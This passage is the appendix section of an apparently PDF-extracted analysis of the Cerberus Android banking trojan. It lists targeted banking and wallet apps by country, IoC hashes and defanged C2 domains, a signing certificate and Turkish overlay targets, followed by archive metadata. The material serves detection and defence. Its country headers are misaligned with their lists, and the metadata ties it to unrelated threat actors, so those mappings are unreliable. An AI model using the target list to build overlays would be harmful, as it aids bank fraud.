**Poland**\n\n\nar.com.santander.rio.mbanking\ncom.bancomer.mbanking\ncom.bankinter.launcher\ncom.bbva.bbvacontigo\ncom.bbva.netcash\ncom.cajasur.android\ncom.db.pbc.mibanco\ncom.kutxabank.android\ncom.rsi\ncom.tecnocom.cajalaboral\nes.bancosantander.apps\nes.bancosantander.empresas\nes.caixagalicia.activamovil\nes.caixageral.caixageralapp\nes.cm.android\nes.evobanco.bancamovil\nes.lacaixa.mobile.android.newwapicon\nes.liberbank.cajasturapp\nes.univia.unicajamovil\nnet.inverline.bancosabadell.officelocator.android\norg.stgeorge.bank\nwww.ingdirect.nativeframe\n\n\ncom.amazon.mShop.android.shopping\ncom.att.myWireless\ncom.chase.sig.android\ncom.clairmail.fth\ncom.discoverfinancial.mobile\ncom.google.android.gm\ncom.infonow.bofa\ncom.instagram.android\ncom.konylabs.capitalone\ncom.microsoft.office.outlook\ncom.netflix.mediaclient\ncom.paypal.android.p2pmobile\ncom.snapchat.android\ncom.suntrust.mobilebanking\ncom.twitter.android\ncom.usaa.mobile.android.usaa\ncom.usbank.mobilebanking\ncom.wf.wellsfargomobile\ncom.whatsapp\ncom.yahoo.mobile.client.android.mail\n\n\ncom.akbank.android.apps.akbank_direkt\ncom.albarakaapp\ncom.finansbank.mobile.cepsube\ncom.garanti.cepsubesi\ncom.ingbanktr.ingmobil\ncom.kuveytturk.mobil\ncom.magiclick.odeabank\ncom.mobillium.papara\ncom.paribu.app\ncom.pozitron.iscep\ncom.pttfinans\ncom.teb\ncom.tmobtech.halkbank\ncom.vakifbank.mobile\ncom.ykb.android\ncom.ziraat.ziraatmobil\nfinansbank.enpara\ntr.com.hsbc.hsbcturkey\ntr.com.sekerbilisim.mbank\n\n\ncom.empik.empikapp\ncom.empik.empikfoto\ncom.finanteq.finance.ca\ncom.getingroup.mobilebanking\neu.eleader.mobilebanking.pekao.firm\neu.eleader.mobilebanking.pekao\npl.allegro\npl.bzwbk.bzwbk24\npl.bzwbk.ibiznes24\npl.ceneo\npl.com.rossmann.centauros\npl.mbank\npl.millennium.corpApp\npl.orange.mojeorange\npl.pkobp.iko\nwit.android.bcpBankingApp.millenniumPL\n\n\n**Germany** **Italy** **Australia** **France**\n\n\ncom.db.mm.norisbank\ncom.db.pwcc.dbmobile\ncom.starfinanz.smob.android.sfinanzstatus\ncom.targo_prod.bad\nde.comdirect.android\nde.commerzbanking.mobil\nde.consorsbank\nde.dkb.portalapp\nde.fiducia.smartphone.android.banking.vr\nde.ingdiba.bankingapp\nde.postbank.finanzassistent\neu.unicreditgroup.hvbapptan\n\n\ncom.CredemMobile\ncom.db.pbc.miabanca\ncom.latuabancaperandroid\ncom.lynxspa.bancopopolare\ncom.unicredit\nit.bnl.apps.banking\nit.carige\nit.copergmps.rt.pf.android.sp.bmps\nit.ingdirect.app\nit.nogood.container\nit.popso.SCRIGNOapp\nposteitaliane.posteapp.apppostepay\n\n\nau.com.bankwest.mobile\nau.com.ingdirect.android\nau.com.nab.mobile\ncom.anz.android.gomoney\ncom.bankofqueensland.boq\ncom.bendigobank.mobile\ncom.commbank.netbank\ncom.fusion.banking\ncom.fusion.beyondbank\ncom.greater.Greater\norg.banksa.bank\n\n\ncom.boursorama.android.clients\ncom.caisseepargne.android.mobilebanking\ncom.cic_prod.bad\ncom.cm_prod.bad\ncom.fullsix.android.labanquepostale.accountaccess\ncom.IngDirectAndroid\nfr.banquepopulaire.cyberplus\nfr.creditagricole.androidapp\nfr.lcl.android.customerarea\nmobi.societegenerale.mobile.lappli\nnet.bnpparibas.mescomptes\n\n\n-----\n\n**United Kingdom** **India** **Japan** **Portugal**\n\n\ncom.barclays.android.barclaysmobilebanking\ncom.grppl.android.shell.CMBlloydsTSB73\ncom.grppl.android.shell.halifax\ncom.grupocajamar.wefferent\ncom.htsu.hsbcpersonalbanking\ncom.moneybookers.skrillpayments\ncom.moneybookers.skrillpayments.neteller\nuk.co.santander.santanderUK\n\n\ncom.csam.icici.bank.imobile\ncom.mobikwik_new\ncom.oxigen.oxigenwallet\ncom.sbi.SBIFreedomPlus\ncom.snapwork.IDBI\norg.bom.bank\n\n\ncc.bitbank.bitbank\ncom.gmowallet.mobilewallet\ncom.quoine.quoinex.light\njp.coincheck.android\njp.co.rakuten_bank.rakutenbank\n\n\npt.bancobpi.mobile.fiabilizacao\npt.novobanco.nbapp\npt.santandertotta.mobileparticulares\nwit.android.bcpBankingApp.millennium\n\n\n**Canada** **Greece** **Austria** **Czech Republic**\n\n\ncom.bmo.mobile\ncom.cibc.android.mobi\ncom.rbc.mobile.android\n\n\ncom.EurobankEFG\ncom.mobileloft.alpha.droid\nmbanking.NBG\n\n\nat.volksbank.volksbankmobile\ncom.bankaustria.android.olb\n\n\ncz.csob.smartbanking\neu.inmite.prj.kb.mobilbank\n\n\n**New Zealand** **Israel** **Luxembourg** **Malta**\n\n\ncom.anz.android.gomoney\nnz.co.asb.asbmobile\n\n\ncom.ideomobile.hapoalim piuk.blockchain.android com.binance.dev\n\n\n**Morocco** **Netherlands** **Peru** **Saudi Arabia**\n\n\nma.gbp.pocketbank com.abnamro.nl.mobile.payments pe.com.interbank.mobilebanking\n\n\ncom.samba.mb\n\n\n**United Arab Emirates**\n\n\norg.telegram.messenger\n\n\n-----\n\n## Appendix.C – IoC Table\n\n**AppName** **MainActivity** **MINSDK** **EncryptedDEX** **SHA1Sum** **C2** **Size(MB)**\n\nzkkhkrwuhuzyceyobartcprpp.tjxumszktyhbsrjbxb.bywitgzdnkqnuhbilfyyflycu.eaaym\n30GbKazan 20 OLJgc.json c66a0a2708d42dfb0ca3c7d07d02cefa12e98e40 hxxp[:]//mantiak[.]site 1.65\nxscdywwuaf\n\n5G_Turkcell hxdhpatrritcdgljiluiysg.ifacueugolkkhnf.yaqtduosjtcdjxofosal.jrnk 15 NpA.json 86473adb8072dec58d92bc98a0bca81f5900723e hxxp[:]//kryll[.]ug 1.42\nAntivirus dbcokwappsdhrcmwixsbdonsb.wsfbr.cgoclqnxhzgznwutbeqeofauj.tiibvouayc 20 jJ.json 19b1922967d55909a08c920916af75b8c145b669 hxxp[:]//odry[.]press 1.66\n\nokqyxdklzanoklhehwqdgiadsn.xndfwxtxaxxlsryatlobgszsiec.pdwkyskxcs.pahfqufyjim\nBildirim 20 CH.json 302dea9d2ee1a97ad026d6c59191de6ccfdd153f hxxp[:]//olalalalalal[.]cyou 2.15\nrcwen\n\nBildirim akqcp.mafu.mtwwyjhbsxj.ear 20 REG.json 84413bd33aa30bb45a8e8bd2a4c98a158619f160 hxxp[:]//konusuyonyapraam[.]cyou 1.94\nC19 Online teoxasuzfloiqohgg.nhez.mjeikddql.gdhvxjovtdmr 20 iyOAXQ.json 21fb5ae2e813777c00699bab7f2e316838ea4c7a hxxp[:]//baykuratti[.]site 2.06\ncevir kazan gyuhdfhwlqz.lbkzzysjbhwueqyszj.gkfnt.byuqixelqjd 20 sLk.json 4504b0f9db9867243bb074dc14fc9b330a3e1d73 hxxp[:]//malimaskim[.]xyz 2.22\nCevir kazan eakdgkwaur.jnpkxpethrjdyszfzbhobkdgegc.uwmrodcfue.hvgbogo 20 ASmk.json 6b31aaca8276cb95de2892cdd580172c701533aa hxxp[:]//malimaskim[.]xyz 1.87\n\ninfdgjzqhbmhahgzdgjgo.rruwdswakjxmkoxqyxppo.atriepziiolbnpswmmge.tctrsmjyc\nCovin-19 15 oMSELc.json f15c0c7b8773dbf6f29194780cd733c0b450ba6b hxxp[:]//indigojeans[.]top 1.69\ncycdgds\n\neDestek dflfgplj.wczmsschglwnhytpszpccibuui.glglriwhjlwqlzlxi.gtrptaee 20 hByGgs.json 9624cc6439bac53bef2686311bc77d5ba29e07d2 hxxp[:]//sananekardesbanane[.]com 2.28\neDestek amnoroist.kiscoxoigdd.dijknkgjjeqcgyahkpaxfdyszcy.irnblujkvqhvu 20 pnC.json afb68420e017b4143327badd688a8f9069887219 hxxp[:]//isledimay[.]xyz 1.85\ne-Devlet wwpthhuikjgedzwpfqxzmix.mtweihqmottdgam.ihpzmisckszkjwjyjuhp.lpsxirsnugntm 20 hLeQjGN.json 3f3ba34611a807a7b720e6f48ae86415886ff49d hxxp[:]//enayiusom[.]com 1.96\n\nwoaozffhounbhnkfkbidsxgm.ctdjszqkhyodhahhnoj.xemymqhrhrjwnjqeic.qednqxwn\ne-Devlet 20 ZZC.json a3e9bad4ea0941dd691c787d3a3b0189d01b013e hxxp[:]//redondibic05[.]site 1.74\nofysdwog\n\nE-Devlet sksijoouenmdgadeyzafqbxkt.fubriza.qkpgswrrjmast.lncmhn 20 qxhycN.json d5b683b727276e9b9a09a3593b083f9b07baab4d hxxp[:]//evdekalmayaninanaskm[.]com 2.10\nEvdeYasamVar exmi.afpih.kxdg.oymepudftnrw 20 EuwA.json 171c0c81696cbbe01488ed37b9da622232fe365d hxxp[://gesibaglarindadolaniyorumm[.top 2.08\nFlash Player jfppnaidkjinhnnkhuglrbqpzu.nzlqfztusjkzfg.cfsmerwykthszegihtbqnlxcah.squiffpigkj 15 UpBdoj.json 6708aba84e9279a20cd6f7c8f60ca0f0c8d2a9ba hxxp[:]//ffesotoronuer[.]xyz 1.21\nGoogle Play qybpsjxcehxgnog.srmynutfdldxykxesdimae.tlf.kbb 20 UFfHs.json 6af944f7583fe28e04c21a04967aa07e3e93c28c hxxp[:]//kusakel5[.]com 1.68\nGoogle Play ksnsdetpaxmeuzhpddwcsmhaql.idarrwbkkr.wpigguns.zmhgppsstmlbmpf 20 lpKQCr.json 6fb5106f40933644d1728347ee80669a624fe176 hxxp[:]//kusakel7[.]com 1.79\nGoogle Play xgkt.ncxzkbisryt.palbcxw.qlycainrja 20 qySTLI.json c4fbc3620c07e9d87f4dbfdce0d50a7a5434420f hxxp[:]//cacecarsa8[.]com 2.03\nGoogle Play xqfeinytr.biphelgogahacfgdzxoorxfjewq.lqueypbnyejetokmohatd.pfozypq 20 Rns.json fc89225711386b4eeea196d8494fbce1b2b7a679 hxxp[:]//kusakel1[.]com 1.99\nGoogle Update bokfsjnahepi.dkmasjexmnhcpwssrhhlz.zxwqn.wcnkj 20 mrC.json 57ed2fb24661cc995adb3d55cf0a8336f05b65c8 hxxp[:]//217[.]8[.]117[.]30 2.04\nGTA V com.sakkkwyl.ncceberwpdhfq.iexuymsx 15 Not Encrypted 83424215154b1fae5976bf8a23341b6eb1f8f7f5 hxxp[:]//91[.]210[.]169[.]114/ 0.48\nH.E.S(HayatEve\nemrymdyyusgmouugpieocs.mdbmliqxjgjzwosjpukp.fyktaec.ljd 20 TcPaEy.json 224f4bb18e9e0de42e1c9f926916f7c81762d6c0 hxxp[:]//onenightsten[.]one 1.96\nSigar)\n\nInpost sxegsbarhxycdammk.bfmramaqpwalppblj.pntpojdteozlllqrhplaquuxcb.jhlpwq 20 mKoUO.json 688e487b6a826d3cd7b3fbe220a74f699d3c3f8e hxxp[:]//inpostinfo[.]com 1.98\nInpost prlbtgul.cgjpknff.zxwjxmksxkcjrhcnex.ptfppzgoyiipmbr 20 PSqn.json 6d5b58dd87b6bbec736fc73fb02b4f82ef5c4874 hxxp[:]//inpostinfo[.]com 2.17\nInPost_Paczko\nkssqpzibgxirrqcd.hjzkfqpxuslixaqpnyhizphb.yxx.nyecrckyc 20 jEjO.json 8e2e8f141004a472b436e445897a0bc41e509ee0 hxxp[:]//nfietreee3ffskc9ss[.]top 2.03\nmat\n\nInPost_Paczko\ngizguhyer.ufusmtcipoyqjwytbgf.ujwcqsjkpkixp.rpt 20 igULN.json fcf29a7df65ac03f380c458447ccb22f34872eb6 hxxp[:]//jglkgsnerivy3wksaczx[.]top 2.16\nmat\n\nInPost_Paczko\noswylhacosqliuqj.sjqlldorqfhxpsnsjkzyqodenne.uiugonrzglhbbyhubkc.jveq 15 mpYSCtd.json 9d86e2fda388f4ade41f622dc1cd97988d02237d hxxp[:]//utyebwerr5f[.]top 2.24\nmaty\n\nMcAfeeSecurity dsyiftrrzbijzofgn.sjatmnksktqqghxtqeerrshyhu.wwphaceqtnpnqjpq.bivbvuiozdv 20 jRl.json 99abf018c96e00dad999309e1e6d910d248d43c0 hxxp[:]//bestuniquefest[.]pw 1.95\nNETFLIX UHD ngfy.kprrhib.wzbmzhfoewkdxomdah.fnfwlryrmmvrklhs 15 HFG.json 2e21aa95435b3e0cfb406f1be5442790a96d5cb4 hxxp[:]//privateone[.]top 1.40\nSosyal Destek\ndsowzmmtpdfuizncpq.lrsa.lrpgakqoswcadnhhhewoeckzdk.xxbtcgnudmv 20 ZWnaZ.json 55a330a6e878c25fb0668d77a68c645a4b5277f7 hxxp[:]//cemkeskin[.]xyz/ 1.66\n30 GB\n\n\n-----\n\nMost of the samples analysed during research had the following signature unless the sample originated from Google Play:\n\n\nSignature:\n\nOwner: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US\n\nIssuer: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US\n\nSerial number: 936eacbe07f201df\n\nValid from: Fri Feb 29 04:33:46 MSK 2008 until: Tue Jul 17 04:33:46 MSK 2035\n\nCertificate fingerprints:\n\nSHA1: 61:ED:37:7E:85:D3:86:A8:DF:EE:6B:86:4B:D8:5B:0B:FA:A5:AF:81\n\nSHA256: A4:0D:A8:0A:59:D1:70:CA:A9:50:CF:15:C1:8C:45:4D:47:A3:9B:26:98:9D:8B:64:0E:CD:74:5B:A7:1B:F5:DC\n\nSignature algorithm name: SHA1withRSA\n\nSubject Public Key Algorithm: RSA (2048)\n\nVersion: 3\n\n\n-----\n\n## Appendix.D Turkish Banks Injection Overlays\n\nGARANTİ BANKASI İŞ BANKASI ZİRAAT BANKASI\n\n\n-----\n\n**AKBANK** **YAPI KREDİ BANKASI** **ING BANK**\n\n\n-----\n\n**VAKIFBANK** **QNB FİNANSBANK** **TÜRKİYE EKONOMİ BANKASI**\n\n\n-----\n\n**ALBARAKA TÜRK KATILIM BANKASI** **HALBANK** **HSBC**\n\n\n-----\n\n**KUVEYTÜRK KATILIM BANKASI** **ENPARA** **ODEABANK**\n\n\n-----\n\n**PAPARA** **ŞEKERBANK** **PTT BANK**\n\n\n-----\n\n**PARİBU**\n\n\n-----\n\n**Biznet Bilişim Sistemleri ve Danışmanlık Sanayi Tic. A.Ş.**\n\n**Ticari Sicil No: 159433**\n\n\nİSTANBUL\nNida Kule Plaza,\nKozyatağı Mah.\nDeğirmen Sok. No:18\nKat:19 34742 Kozyatağı,\nKadıköy, İstanbul\n+90 216 688 81 82\n\n\nANKARA\nODTÜ Teknokent İkizler\nBinası Üniversiteler Mah.\nİhsan Doğramacı Bulvarı\nNo:35 B Blok Kat:1 06800\nÇankaya / Ankara\n+90 312 210 11 77\n\n\nDUBAI\nSECURRENT ME FZ LLC\n214, Building 12, DIC\n502318, UAE - Dubai\n+9 971 4 390 16 46-49\n\n\nLAHEY/ HOLLANDA\nPenetra Cyber Security\nStrawinskylaan 411\n1077XX Amsterdam\nThe Netherlands\n+31 (0)70-2045180\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://www.biznet.com.tr/wp-content/uploads/2020/08/Cerberus.pdf",
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-28 - Cerberus Banking Trojan Analysis.pdf"
    ],
    "report_names": [
        "Cerberus.pdf",
        "2020-08-28 - Cerberus Banking Trojan Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "a7d4fe31-d92f-425a-ba8c-c70219f52fb8",
            "created_at": "2022-10-25T15:50:23.466009Z",
            "updated_at": "2025-03-27T02:00:55.477162Z",
            "deleted_at": null,
            "main_name": "Frankenstein",
            "aliases": [
                "Frankenstein"
            ],
            "source_name": "MITRE:Frankenstein",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "56b3eb1d-6baf-4ee4-a098-ec0081280315",
            "created_at": "2024-09-28T02:05:36.599884Z",
            "updated_at": "2025-03-27T02:05:17.250078Z",
            "deleted_at": null,
            "main_name": "ALUMINUM THORN",
            "aliases": [
                "WIRTE ",
                "Frankenstein "
            ],
            "source_name": "Secureworks:ALUMINUM THORN",
            "tools": [
                " Powershell Empire",
                "FruityC2"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1598608853,
    "ts_modification_date": 1598608853,
    "files": {
        "pdf": "https://archive.orkl.eu/69e3a1f86807d951a291a40f8f7279ef779fff4d.pdf",
        "text": "https://archive.orkl.eu/69e3a1f86807d951a291a40f8f7279ef779fff4d.txt",
        "img": "https://archive.orkl.eu/69e3a1f86807d951a291a40f8f7279ef779fff4d.jpg"
    }
}